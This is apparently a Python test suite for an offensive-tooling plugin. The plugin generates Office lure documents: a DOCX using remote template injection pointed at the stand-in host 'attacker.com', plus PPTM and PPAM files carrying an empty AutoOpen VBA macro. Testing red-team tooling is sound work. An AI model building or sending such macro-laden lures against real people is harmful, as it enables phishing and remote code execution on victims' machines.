"""
Test suite for plugin_payload_officedoc.py
Tests DOTM remote template injection, PPTM, and PPAM Office document generation.

All formats are pure-Python OOXML (ZIP) - no Office installation required.
"""

import pathlib
import sys
import tempfile
import traceback
import zipfile

sys.path.insert(0, str(pathlib.Path(__file__).parent.parent))

# Ensure UTF-8 output on Windows consoles (CP1252 cannot encode ✓/✗)
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from plugin_payload_officedoc import PayloadOfficeDocPlugin

passed = 0
failed = 0

VBA_SOURCE = "Sub AutoOpen()\nEnd Sub"


def report(name, ok, detail=""):
    global passed, failed
    if ok:
        passed += 1
        print(f"  ✓ {name}")
        if detail:
            print(f"    {detail}")
    else:
        failed += 1
        print(f"  ✗ {name}")
        if detail:
            print(f"    {detail}")


def main():
    print("\n=======================================================================")
    print("TEST SUITE: plugin_payload_officedoc.py")
    print("=======================================================================\n")

    with tempfile.TemporaryDirectory(prefix="erebus_officedoc_test_") as temp_dir:
        temp_path = pathlib.Path(temp_dir)
        payload_dir = temp_path / "payload"
        payload_dir.mkdir()

        # [1] Plugin Instantiation
        print("\n[1] Testing Plugin Instantiation")
        print("-" * 70)
        try:
            plugin = PayloadOfficeDocPlugin()
            report("PayloadOfficeDocPlugin instantiates without error", True)
        except Exception as e:
            report("PayloadOfficeDocPlugin instantiates without error", False, f"Exception: {e}")
            traceback.print_exc()
            print(f"\nRESULTS: {passed} passed, {failed} failed")
            return 1

        # [2] DOTM Remote Template Injection
        print("\n[2] Testing DOTM Remote Template Injection (DOCX)")
        print("-" * 70)
        TEMPLATE_URL = "https://attacker.com/t.dotm"
        docx_path = str(payload_dir / "lure.docx")
        try:
            result = plugin.create_dotm_template_injection(
                template_url=TEMPLATE_URL,
                output_path=docx_path,
            )
            report("create_dotm_template_injection() returns a Path",
                   isinstance(result, pathlib.Path), f"Got: {type(result)}")
            report("DOCX file exists", result.exists(), f"Path: {result}")

            if result.exists():
                size = result.stat().st_size
                report("DOCX file size > 0", size > 0, f"Size: {size} bytes")

                # Validate it is a ZIP
                is_zip = zipfile.is_zipfile(str(result))
                report("DOCX is a valid ZIP file", is_zip)

                if is_zip:
                    with zipfile.ZipFile(str(result), "r") as zf:
                        names = zf.namelist()
                        report("ZIP contains word/document.xml",
                               "word/document.xml" in names,
                               f"Files: {names}")
                        report("ZIP contains word/settings.xml",
                               "word/settings.xml" in names)

                        rels_name = "word/_rels/document.xml.rels"
                        report(f"ZIP contains {rels_name}",
                               rels_name in names)

                        if rels_name in names:
                            rels_content = zf.read(rels_name).decode("utf-8")
                            report("document.xml.rels contains attacker.com",
                                   "attacker.com" in rels_content,
                                   f"rels excerpt: {rels_content[:200]}")
                else:
                    report("ZIP contains word/document.xml", False, "Not a valid ZIP")
                    report("ZIP contains word/settings.xml", False, "Not a valid ZIP")
                    report("ZIP contains word/_rels/document.xml.rels", False, "Not a valid ZIP")
                    report("document.xml.rels contains attacker.com", False, "Not a valid ZIP")
            else:
                for name in [
                    "DOCX file size > 0",
                    "DOCX is a valid ZIP file",
                    "ZIP contains word/document.xml",
                    "ZIP contains word/settings.xml",
                    "ZIP contains word/_rels/document.xml.rels",
                    "document.xml.rels contains attacker.com",
                ]:
                    report(name, False, "File does not exist")
        except Exception as e:
            report("create_dotm_template_injection()", False, f"Exception: {e}")
            traceback.print_exc()

        # [3] PPTM Payload Creation
        print("\n[3] Testing PPTM Payload Creation")
        print("-" * 70)
        pptm_path = str(payload_dir / "payload.pptm")
        try:
            result_pptm = plugin.create_pptm_payload(
                vba_source=VBA_SOURCE,
                output_path=pptm_path,
            )
            report("create_pptm_payload() returns a Path",
                   isinstance(result_pptm, pathlib.Path), f"Got: {type(result_pptm)}")
            report("PPTM file exists", result_pptm.exists(), f"Path: {result_pptm}")

            if result_pptm.exists():
                is_zip_pptm = zipfile.is_zipfile(str(result_pptm))
                report("PPTM is a valid ZIP file", is_zip_pptm)

                if is_zip_pptm:
                    with zipfile.ZipFile(str(result_pptm), "r") as zf_pptm:
                        names_pptm = zf_pptm.namelist()
                        report("PPTM ZIP contains ppt/presentation.xml",
                               "ppt/presentation.xml" in names_pptm,
                               f"Files: {names_pptm}")
                        report("PPTM ZIP contains ppt/vbaProject.bin",
                               "ppt/vbaProject.bin" in names_pptm)
                else:
                    report("PPTM ZIP contains ppt/presentation.xml", False, "Not a valid ZIP")
                    report("PPTM ZIP contains ppt/vbaProject.bin", False, "Not a valid ZIP")
            else:
                report("PPTM is a valid ZIP file", False, "File does not exist")
                report("PPTM ZIP contains ppt/presentation.xml", False, "File does not exist")
                report("PPTM ZIP contains ppt/vbaProject.bin", False, "File does not exist")
        except Exception as e:
            report("create_pptm_payload()", False, f"Exception: {e}")
            traceback.print_exc()

        # [4] PPAM Payload Creation
        print("\n[4] Testing PPAM Payload Creation (PowerPoint Add-In)")
        print("-" * 70)
        ppam_path = str(payload_dir / "addin.ppam")
        try:
            result_ppam = plugin.create_ppam_payload(
                vba_source=VBA_SOURCE,
                output_path=ppam_path,
            )
            report("create_ppam_payload() returns a Path",
                   isinstance(result_ppam, pathlib.Path), f"Got: {type(result_ppam)}")
            report("PPAM file exists", result_ppam.exists(), f"Path: {result_ppam}")

            if result_ppam.exists():
                is_zip_ppam = zipfile.is_zipfile(str(result_ppam))
                report("PPAM is a valid ZIP file", is_zip_ppam)

                if is_zip_ppam:
                    with zipfile.ZipFile(str(result_ppam), "r") as zf_ppam:
                        names_ppam = zf_ppam.namelist()
                        report("PPAM ZIP contains ppt/presentation.xml",
                               "ppt/presentation.xml" in names_ppam)

                        if "ppt/presentation.xml" in names_ppam:
                            pres_content = zf_ppam.read("ppt/presentation.xml").decode("utf-8")
                            report('PPAM presentation.xml contains isAddIn="1"',
                                   'isAddIn="1"' in pres_content,
                                   f"excerpt: {pres_content[:300]}")
                        else:
                            report('PPAM presentation.xml contains isAddIn="1"', False,
                                   "ppt/presentation.xml not found in ZIP")
                else:
                    report("PPAM ZIP contains ppt/presentation.xml", False, "Not a valid ZIP")
                    report('PPAM presentation.xml contains isAddIn="1"', False, "Not a valid ZIP")
            else:
                report("PPAM is a valid ZIP file", False, "File does not exist")
                report("PPAM ZIP contains ppt/presentation.xml", False, "File does not exist")
                report('PPAM presentation.xml contains isAddIn="1"', False, "File does not exist")
        except Exception as e:
            report("create_ppam_payload()", False, f"Exception: {e}")
            traceback.print_exc()

        # [5] PPTM vs PPAM Differentiation
        print("\n[5] Testing PPTM vs PPAM Differentiation (isAddIn flag)")
        print("-" * 70)
        try:
            pptm2_path = str(payload_dir / "check_pptm.pptm")
            result_pptm2 = plugin.create_pptm_payload(
                vba_source=VBA_SOURCE,
                output_path=pptm2_path,
            )
            if result_pptm2.exists() and zipfile.is_zipfile(pptm2_path):
                with zipfile.ZipFile(pptm2_path, "r") as zf2:
                    if "ppt/presentation.xml" in zf2.namelist():
                        pres2 = zf2.read("ppt/presentation.xml").decode("utf-8")
                        report("PPTM presentation.xml does NOT contain isAddIn",
                               'isAddIn="1"' not in pres2,
                               "Confirmed: PPTM is not flagged as add-in")
                    else:
                        report("PPTM presentation.xml does NOT contain isAddIn", False,
                               "ppt/presentation.xml missing")
            else:
                report("PPTM presentation.xml does NOT contain isAddIn", False,
                       "Could not open PPTM for comparison")
        except Exception as e:
            report("PPTM/PPAM differentiation", False, f"Exception: {e}")
            traceback.print_exc()

        # [6] Plugin Registration
        print("\n[6] Testing Plugin Registration")
        print("-" * 70)
        try:
            registered = plugin.register()
            report("register() returns a dict", isinstance(registered, dict))
            report("register() contains 'create_dotm_template_injection'",
                   "create_dotm_template_injection" in registered)
            report("register() contains 'create_pptm_payload'",
                   "create_pptm_payload" in registered)
            report("register() contains 'create_ppam_payload'",
                   "create_ppam_payload" in registered)
        except Exception as e:
            report("Plugin registration", False, f"Exception: {e}")
            traceback.print_exc()

        # [7] Plugin Metadata and Validation
        print("\n[7] Testing Plugin Metadata and Validation")
        print("-" * 70)
        try:
            meta = plugin.get_metadata()
            report("get_metadata() returns metadata", meta is not None)
            valid = plugin.validate()
            report("validate() returns True", valid is True)
        except Exception as e:
            report("Plugin metadata/validation", False, f"Exception: {e}")
            traceback.print_exc()

    print(f"\nRESULTS: {passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"FATAL ERROR: {e}")
        traceback.print_exc()
        sys.exit(1)
